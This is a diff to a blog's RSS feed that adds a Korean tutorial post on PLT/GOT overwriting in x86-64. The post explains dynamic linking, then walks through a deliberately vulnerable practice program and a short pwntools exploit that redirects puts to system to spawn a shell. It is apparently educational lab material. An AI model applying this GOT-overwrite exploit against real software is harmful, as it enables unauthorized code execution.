@@ -5,10 +5,210 @@
     <description>Harder than you thought, easier than you expected</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 06 Dec 2022 22:19:25 +0900</pubDate>
-    <lastBuildDate>Tue, 06 Dec 2022 22:19:25 +0900</lastBuildDate>
+    <pubDate>Wed, 21 Dec 2022 11:22:14 +0900</pubDate>
+    <lastBuildDate>Wed, 21 Dec 2022 11:22:14 +0900</lastBuildDate>
     <generator>Jekyll v4.2.2</generator>
 
+    
+      <item>
+        <title>PLT &amp; GOT Overwrite in x86-64</title>
+        <description>&lt;h1 id=&quot;0-pltgot란&quot;&gt;0. PLT&amp;amp;GOT란?&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://toubva.github.io/blog/protostar-stack5-x86-x64/#/&quot;&gt;이전 포스트의 섹션 3&lt;/a&gt; 에서 다루었던 요소가 있다. 바로 GCC 를 이용한 C 언어 소스 코드 컴파일 시, 파일 실행 시의 행위였다. 가볍게 해당 과정을 되살려보자. (정적 라이브러리 방식은 현재 주제와 관련 없으므로 쓰지 않았다)&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;01-컴파일-시의-행위동적-라이브러리-참조&quot;&gt;0.1. 컴파일 시의 행위(동적 라이브러리 참조)&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;프로그램 컴파일 명령어를 보낸다.&lt;/li&gt;
+  &lt;li&gt;gcc는 링커를 트리거한다.&lt;/li&gt;
+  &lt;li&gt;링커는 어떤 컴파일러를 쓰는지, 소스에는 어떤 라이브러리가 명시되어 있는지 체크해 필요한 라이브러리를 찾아낸다.
+    &lt;ul&gt;
+      &lt;li&gt;이 때 라이브러리를 찾아내는 과정에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Linker Name&lt;/code&gt; 을 참고한다(.so 파일).&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;그리고 해당 라이브러리의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt; 을 읽어온다(.so.2.6 등의 버전 넘버).&lt;/li&gt;
+  &lt;li&gt;읽어온 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt; 을 기준으로 라이브러리들을 파일에 연결시켜 컴파일한다.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;02-파일-실행-시의-행위동적-라이브러리-참조&quot;&gt;0.2. 파일 실행 시의 행위(동적 라이브러리 참조)&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;파일을 실행하면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dynamic Loader&lt;/code&gt; 가 트리거된다.&lt;/li&gt;
+  &lt;li&gt;Dynamic Linking 된 공유 라이브러리들을 컴파일 단계에서 확보해 둔 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt; 을 이용해 찾아 낸다.&lt;/li&gt;
+  &lt;li&gt;이후 찾아낸 라이브러리들을 해당 ELF 파일의 가상 메모리 섹션에 탑재한다. (리눅스의 경우 heap과 stack 사이에 라이브러리가 탑재되고 윈도우의 경우 스택의 엉덩이에 힙의 엉덩이가 맞붙어 있는.. 형태라… 애플리케이션이 탑재된 영역 아래에 커널 라이브러리 영역이 탑재된다)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;br /&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;03-정리&quot;&gt;0.3. 정리&lt;/h2&gt;
+
+&lt;p&gt;즉, 정적 라이브러리 방식으로 파일을 컴파일 및 실행하게 된다면 당연히 모든 라이브러리와 함수가 해당 소스 코드에 포함된 상태로 실행되므로 굳이 라이브러리에 명시된 함수의 주소를 알아오는 과정이 필요하지 않지만&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;동적 라이브러리 링킹 방식으로 파일을 컴파일하거나 실행&lt;/strong&gt;할 때, 다양한 라이브러리 파일을 해당 소스 코드에 링킹하기 때문에 &lt;strong&gt;해당 라이브러리는 메모리의 어느 위치에 탑재되었는지, 그 라이브러리 내에 정의된 함수들은 어느 위치에 탑재되었는지&lt;/strong&gt;에 관한 정보가 필수적이다.&lt;/p&gt;
+
+&lt;p&gt;이런 식의 정보를 쉽게 알려주기 위해 &lt;strong&gt;plt와 got&lt;/strong&gt;를 사용하게 되었다.&lt;/p&gt;
+
+&lt;p&gt;위의 기능이 언제나 가능하도록 만들기 위해 &lt;strong&gt;“plt의 주소는 언제나 고정되어 있다”.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pltgot/Untitled.jpeg&quot; alt=&quot;최초로 함수의 주소를 알아올 때 plt와 got의 행위를 나타낸 도식.&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;최초로 함수의 주소를 알아올 때 plt와 got의 행위를 나타낸 도식.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;PLT(Procedure Linkage Table)&lt;/strong&gt;는 현재 콜하려는 라이브러리상의 함수의 주소를 &lt;strong&gt;got의 어느 부분이 가리키는지&lt;/strong&gt; 알고 있다.
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jmp {rip-x(address)}&lt;/code&gt; 포맷의 인스트럭션을 이용해 필요한 함수의 주소를 가지고 있는 got의 지점으로 포워딩해 준다.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;GOT(Global Offset Table)&lt;/strong&gt;는 현재 콜하려는 라이브러리상의 &lt;strong&gt;함수의 주소를 정확히&lt;/strong&gt; 알고 있다.
+    &lt;ul&gt;
+      &lt;li&gt;다만, got 상에서 처음으로 함수의 주소를 알아내려 할 때 당시에는 got에 해당 함수의 주소가 없다.
+        &lt;ul&gt;
+          &lt;li&gt;got를 이용해 해당 함수의 주소를 알아내려고 할 때가 되어서야 Linker가 dl_resolve라는 함수를 이용해 주소를 알아와서 넣어준다.&lt;/li&gt;
+          &lt;li&gt;따라서 첫 번째 접근 이후부터는 got에 항상 주소가 있게 된다.&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;여기에서 중요한 건 &lt;strong&gt;“plt의 주소는 언제나 고정되어 있다”는 점이다. 이를 악용해 ASLR 우회가 가능&lt;/strong&gt;하기 때문이다.&lt;/p&gt;
+
+&lt;p&gt;차후 다른 포스팅에서 got 변조를 이용한 ASLR 우회를 다룰 계획이다.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;1-코드-정적-분석&quot;&gt;1. 코드 정적 분석&lt;/h1&gt;
+
+&lt;p&gt;먼저 주어진 문제 코드를 분석해 보자.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//got_overwrite.c&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;//gcc -o got_overwrite -no-pie&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x601018&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// puts_got&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;libc_system: %p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Overwrite puts_got&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%lx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//overwrite puts_got&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;11-plt와-got-직접-따라가-보기&quot;&gt;1.1 plt와 got 직접 따라가 보기&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*puts_got&lt;/code&gt; 의 초기화 값으로 로컬 환경에서 puts의 got 위치 주소를 직접 찾아다 넣어 줘야 한다.&lt;/p&gt;
+
+&lt;p&gt;puts의 got 위치를 찾는 방법은 아래와 같다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pltgot/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;pwndbg를 이용해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disas main&lt;/code&gt;을 하면, main+121지점에서 puts를 콜할 때 명시적 주소를 콜하는 것을 확인할 수 있다.&lt;/p&gt;
+
+&lt;p&gt;이 때 0x400520에는 무엇이 있길래 그쪽으로 rip를 이동시켜 주는 걸까? 직접 알아보면 아래와 같은 결과를 볼 수 있다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pltgot/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;plt는 got의 특정 위치에 저장된 puts 함수의 주소로 rip를 포워딩&lt;/strong&gt;해 주는 역할을 하고 있었다.&lt;/p&gt;
+
+&lt;p&gt;인스트럭션에 의한다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400526+0x200af2 = 0x601018&lt;/code&gt; 에 실제 puts 함수의 주소가 저장되어 있을 것이다.&lt;/p&gt;
+
+&lt;p&gt;jmp 인스트럭션이 위치한 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400520&lt;/code&gt; 이 아닌 바로 다음 인스트럭션의 주소인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400526&lt;/code&gt; 를 rip의 값으로 사용하는 이유는, 어떤 인스트럭션을 읽어 오기 위해 메모리에 접근하는 순간 pc, 즉 rip의 주소는 바로 다음 인스트럭션을 가리키게 되기 때문이다. 즉, 저 인스트럭션이 수행되는 순간의 rip는 저 인스트럭션 바로 다음 인스트럭션의 주소를 가리키고 있기 때문이다.&lt;/p&gt;
+
+&lt;p&gt;해당 주소(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601018&lt;/code&gt;)에 저장된 값을 확인해 보았다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pltgot/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;got의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601018&lt;/code&gt; 지점에는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400526&lt;/code&gt;이 저장되어 있었고, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400526&lt;/code&gt;으로 이동하면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601010&lt;/code&gt;으로 점프하게 되어 있다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601010&lt;/code&gt;은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601018&lt;/code&gt;과 값이 가깝기 때문에 아마 got의 일부분일 것으로 예상되어 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601010&lt;/code&gt; 지점에 저장된 값 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7ffff7dea8f0&lt;/code&gt; 주소의 인스트럭션을 확인해 보니 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dl_resolve&lt;/code&gt; 계열의 함수임을 알 수 있었다.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;즉, got 는 결과적으로 puts 함수의 주소를 알아내기 위해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dl_resolve&lt;/code&gt; 계열의 함수를 호출한다는 것을 확인할 수 있었다. 해당 함수가 정확히 어떤 매커니즘으로 puts 함수의 주소를 알아내 리턴해주는지에 관해서는 &lt;a href=&quot;https://rond-o.tistory.com/216#f61b16a1-7700-4283-826f-d6ba19990bf7&quot;&gt;여기 블로그&lt;/a&gt;가 정말 잘 설명해 두었으니 링크를 걸어둔다.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;어찌 되었든, puts를 찾기 위해 plt가 rip를 jmp 시키는 주소가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601018&lt;/code&gt; 임을 알았으니 주어진 코드의 puts_got 값을 로컬 환경에 맞게 고칠 수 있게 되었다.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;12-코드-정적-분석&quot;&gt;1.2 코드 정적 분석&lt;/h2&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//got_overwrite.c&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;//gcc -o got_overwrite -no-pie&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x601018&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// puts_got&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;libc_system: %p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Overwrite puts_got&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%lx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//overwrite puts_got&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;주어진 코드는 먼저 system 함수의 주소를 leak 해주고, 입력받은 값을 puts_got 변수 안에 있는 주소에 넣어주는 역할을 하고 있다.&lt;/p&gt;
+
+&lt;p&gt;puts_got 자체가 got 테이블에 저장된 값을 변경하는 것이기 때문에, 우리는 마지막 줄에서 puts가 호출되는 시점에 엉뚱한 system 함수가 호출되도록 puts_got 변수에 system 함수의 주소를 넣어줘야 한다.&lt;/p&gt;
+
+&lt;p&gt;또한 사용자에게 값을 받는 시점에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%lx&lt;/code&gt; 포맷 스트링을 사용하기 때문에 기본으로 8 바이트 값을 받는다고 생각하고 있어 패딩 걱정은 하지 않아도 좋을 것이다.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;2-익스플로잇-설계&quot;&gt;2. 익스플로잇 설계&lt;/h1&gt;
+
+&lt;p&gt;앞서 분석했던 점을 감안하면 익스플로잇이 해야 할 일은 다음과 같다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;먼저 프로그램이 출력하는 시스템 함수의 주소를 받아 저장한다.&lt;/li&gt;
+  &lt;li&gt;저장했던 시스템 함수의 주소를 스트링 형식으로 입력한다. 애초에 포맷 스트링이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%lx&lt;/code&gt; 이므로 스트링으로 입력해 줘야 컴파일러가 알아서 hex 값으로 인식할 것이다.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;3-익스플로잇&quot;&gt;3. 익스플로잇&lt;/h1&gt;
+
+&lt;p&gt;익스플로잇 코드는 아래와 같다.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./got_overwrite&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0x&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;libc_system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_system&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000ffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# gdb.attach(p)
+# raw_input(&quot;1&quot;)
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;앞서 이야기한 것과 같이, plt의 주소는 고정되어 있기 때문에 ASLR을 켜도, ASLR을 꺼도 동일하게 익스플로잇에 성공할 수 있다.&lt;/p&gt;
+
+&lt;p&gt;익스플로잇을 실행한 결과 아래와 같이 쉘을 딸 수 있었다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pltgot/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Wed, 21 Dec 2022 11:15:23 +0900</pubDate>
+        <link>http://localhost:4000/blog/system-hacking/plt-got-overwrite</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/system-hacking/plt-got-overwrite</guid>
+      </item>
     
       <item>
         <title>Protostar-format1.c x86-64</title>
@@ -4404,6 +4604,12 @@ rsp -= 8 //stack grows from high to low
     &lt;a name=&quot;system_hacking&quot;&gt;&lt;/a&gt;
      
     &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/system-hacking/plt-got-overwrite&quot;&gt;PLT &amp;amp; GOT Overwrite in x86-64&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
       &lt;h6&gt;&lt;a href=&quot;/blog/protostar-format1/&quot;&gt;Protostar-format1.c x86-64&lt;/a&gt;&lt;/h6&gt;
     &lt;/article&gt;
 
@@ -4430,6 +4636,12 @@ rsp -= 8 //stack grows from high to low
     &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/protostar&quot;&gt;protostar&lt;/a&gt;&lt;/h4&gt;
     &lt;a name=&quot;protostar&quot;&gt;&lt;/a&gt;
      
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/system-hacking/plt-got-overwrite&quot;&gt;PLT &amp;amp; GOT Overwrite in x86-64&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
     &lt;article class=&quot;center&quot;&gt;
       &lt;h6&gt;&lt;a href=&quot;/blog/protostar-format1/&quot;&gt;Protostar-format1.c x86-64&lt;/a&gt;&lt;/h6&gt;
     &lt;/article&gt;
@@ -4965,6 +5177,8 @@ You can visit the blog using [http://your-github-username.github.io](http://your
             <link>http://localhost:4000/blog/categories/system_hacking_basic/</link>
           </item>
         
+      
+    
       
     
       
